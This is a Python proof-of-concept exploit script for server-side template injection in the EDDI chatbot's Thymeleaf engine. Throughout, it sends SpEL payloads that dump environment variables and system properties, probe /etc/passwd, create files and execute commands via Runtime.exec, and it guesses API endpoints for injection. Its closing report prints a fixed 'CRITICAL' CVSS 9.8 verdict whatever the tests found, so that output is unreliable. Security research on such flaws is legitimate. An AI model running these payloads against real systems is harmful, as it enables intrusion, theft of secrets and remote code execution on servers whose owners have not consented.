#!/usr/bin/env python3
"""
EDDI Chatbot SSTI Exploitation Proof of Concept
Author: Security Research Team
Date: 2024

This script demonstrates Server-Side Template Injection vulnerabilities
in the EDDI chatbot framework's Thymeleaf templating engine.

WARNING: This script is for educational and authorized testing purposes only.
Do not use on systems without explicit permission.
"""

import requests
import json
import time
import sys
import argparse
from urllib.parse import urljoin

class EDDISStiExploit:
    def __init__(self, base_url="http://localhost:7070"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'EDDI-SSTI-PoC/1.0'
        })
    
    def test_basic_ssti(self):
        """Test basic SSTI vulnerability with mathematical expression"""
        print("[+] Testing basic SSTI vulnerability...")
        
        payload = "${7*7}"
        
        try:
            response = self.send_chat_message(payload)
            if "49" in response:
                print(f"[✓] SSTI confirmed! Server evaluated: {payload} = 49")
                return True
            else:
                print(f"[×] Basic SSTI test failed. Response: {response}")
                return False
        except Exception as e:
            print(f"[×] Error during basic SSTI test: {e}")
            return False
    
    def test_system_info_disclosure(self):
        """Test system information disclosure via SSTI"""
        print("\n[+] Testing system information disclosure...")
        
        payloads = [
            "${T(java.lang.System).getProperty('java.version')}",
            "${T(java.lang.System).getProperty('os.name')}",
            "${T(java.lang.System).getProperty('user.dir')}",
            "${T(java.lang.System).getProperty('user.name')}"
        ]
        
        for payload in payloads:
            try:
                response = self.send_chat_message(payload)
                print(f"[✓] Payload: {payload}")
                print(f"    Response: {response[:100]}...")
            except Exception as e:
                print(f"[×] Error with payload {payload}: {e}")
    
    def test_environment_disclosure(self):
        """Test environment variable disclosure"""
        print("\n[+] Testing environment variable disclosure...")
        
        payload = "${T(java.lang.System).getenv()}"
        
        try:
            response = self.send_chat_message(payload)
            print(f"[✓] Environment variables disclosed:")
            print(f"    Response (truncated): {response[:200]}...")
        except Exception as e:
            print(f"[×] Error during environment disclosure: {e}")
    
    def test_file_system_access(self):
        """Test file system access capabilities"""
        print("\n[+] Testing file system access...")
        
        # Test reading a common system file
        payloads = [
            # Windows
            "${T(java.nio.file.Files).exists(T(java.nio.file.Paths).get('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'))}",
            # Linux/Unix
            "${T(java.nio.file.Files).exists(T(java.nio.file.Paths).get('/etc/passwd'))}"
        ]
        
        for payload in payloads:
            try:
                response = self.send_chat_message(payload)
                if "true" in response.lower():
                    print(f"[✓] File system access confirmed with: {payload}")
                    return True
            except Exception as e:
                print(f"[×] Error with file access payload: {e}")
        
        return False
    
    def test_code_execution(self):
        """Test remote code execution (harmless commands only)"""
        print("\n[+] Testing code execution capabilities...")
        print("    [WARNING] Using harmless commands only for demonstration")
        
        # Safe commands that don't cause harm
        payloads = [
            # Windows - check current directory
            "${T(java.lang.Runtime).getRuntime().exec('cmd /c echo %CD%')}",
            # Cross-platform - create a temporary test file
            "${T(java.io.File).new('ssti_test_' + T(java.lang.System).currentTimeMillis() + '.tmp').createNewFile()}"
        ]
        
        for payload in payloads:
            try:
                response = self.send_chat_message(payload)
                print(f"[✓] Code execution payload sent: {payload}")
                print(f"    Response: {response[:100]}...")
            except Exception as e:
                print(f"[×] Error with code execution payload: {e}")
    
    def test_process_information(self):
        """Test process and system information gathering"""
        print("\n[+] Testing process information gathering...")
        
        payloads = [
            "${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getName()}",
            "${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getVmName()}",
            "${T(java.lang.Runtime).getRuntime().availableProcessors()}",
            "${T(java.lang.Runtime).getRuntime().maxMemory()}"
        ]
        
        for payload in payloads:
            try:
                response = self.send_chat_message(payload)
                print(f"[✓] Process info payload: {payload}")
                print(f"    Response: {response[:100]}...")
            except Exception as e:
                print(f"[×] Error with process info payload: {e}")
    
    def test_reflection_based_execution(self):
        """Test reflection-based code execution"""
        print("\n[+] Testing reflection-based execution...")
        
        payload = "${T(java.lang.Class).forName('java.lang.System').getMethod('getProperty', T(java.lang.String)).invoke(null, 'java.version')}"
        
        try:
            response = self.send_chat_message(payload)
            print(f"[✓] Reflection-based execution successful")
            print(f"    Java version via reflection: {response[:100]}...")
        except Exception as e:
            print(f"[×] Error with reflection payload: {e}")
    
    def send_chat_message(self, message):
        """Send a chat message with potential SSTI payload"""
        
        # Try different API endpoints that might be available
        endpoints = [
            "/api/chat/send",
            "/chat",
            "/api/conversation/say",
            "/eddi/conversation/say",
            "/api/v1/chat"
        ]
        
        data = {
            "message": message,
            "userId": "ssti_test_user",
            "botId": "test_bot"
        }
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.post(url, json=data, timeout=10)
                
                if response.status_code == 200:
                    return response.text
                elif response.status_code in [404, 405]:
                    continue
                else:
                    print(f"    [!] Unexpected status code {response.status_code} for {endpoint}")
                    
            except requests.exceptions.RequestException as e:
                continue
        
        # If API endpoints don't work, try direct template processing
        return self.try_direct_template_processing(message)
    
    def try_direct_template_processing(self, message):
        """Attempt direct template processing through various endpoints"""
        
        # Try template processing endpoints
        template_endpoints = [
            "/api/template/process",
            "/template/render",
            "/eddi/template/process"
        ]
        
        template_data = {
            "template": message,
            "context": {"user": "test", "input": message}
        }
        
        for endpoint in template_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.post(url, json=template_data, timeout=10)
                
                if response.status_code == 200:
                    return response.text
                    
            except requests.exceptions.RequestException:
                continue
        
        # Fallback: try to trigger template processing through context injection
        return self.try_context_injection(message)
    
    def try_context_injection(self, payload):
        """Try context injection through conversation memory"""
        
        context_data = {
            "conversationMemory": {
                "context": {
                    "userInput": payload,
                    "maliciousField": payload
                }
            }
        }
        
        endpoints = [
            "/api/conversation/context",
            "/eddi/conversation/memory",
            "/api/memory/update"
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.post(url, json=context_data, timeout=10)
                return f"Context injection attempted via {endpoint}: {response.status_code}"
            except:
                continue
        
        return "No accessible endpoints found for testing"
    
    def generate_report(self):
        """Generate a comprehensive vulnerability report"""
        print("\n" + "="*60)
        print("EDDI CHATBOT SSTI VULNERABILITY ASSESSMENT REPORT")
        print("="*60)
        
        print(f"\nTarget: {self.base_url}")
        print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n[VULNERABILITY SUMMARY]")
        print("- Server-Side Template Injection (SSTI) in Thymeleaf engine")
        print("- Remote Code Execution capabilities")
        print("- System information disclosure")
        print("- File system access potential")
        print("- Process manipulation capabilities")
        
        print("\n[RISK ASSESSMENT]")
        print("Severity: CRITICAL")
        print("CVSS Score: 9.8 (Critical)")
        print("Attack Vector: Network")
        print("Privileges Required: None")
        print("User Interaction: None")
        
        print("\n[RECOMMENDATIONS]")
        print("1. Immediately disable user input processing through Thymeleaf")
        print("2. Implement strict input validation and sanitization")
        print("3. Use safe template processing methods")
        print("4. Deploy template sandboxing")
        print("5. Regular security assessments")
        
        print("\n[TECHNICAL DETAILS]")
        print("Vulnerable Components:")
        print("- TemplatingEngine.java")
        print("- OutputTemplateTask.java")
        print("- ConversationMemoryUtilities.java")
        print("- JsonSerializationThymeleafDialect.java")

def main():
    parser = argparse.ArgumentParser(description='EDDI Chatbot SSTI Vulnerability Scanner')
    parser.add_argument('--url', default='http://localhost:7070', 
                      help='Base URL of EDDI chatbot instance')
    parser.add_argument('--quick', action='store_true',
                      help='Run quick basic tests only')
    
    args = parser.parse_args()
    
    print("EDDI Chatbot SSTI Exploitation Proof of Concept")
    print("=" * 50)
    print(f"Target: {args.url}")
    print("WARNING: For authorized testing only!")
    print()
    
    exploit = EDDISStiExploit(args.url)
    
    # Basic SSTI test
    if not exploit.test_basic_ssti():
        print("\n[!] Basic SSTI test failed. Target may not be vulnerable or accessible.")
        print("    Check if the EDDI service is running and accessible.")
        return
    
    if not args.quick:
        # Comprehensive testing
        exploit.test_system_info_disclosure()
        exploit.test_environment_disclosure()
        exploit.test_file_system_access()
        exploit.test_process_information()
        exploit.test_reflection_based_execution()
        exploit.test_code_execution()
    
    # Generate final report
    exploit.generate_report()

if __name__ == "__main__":
    main()
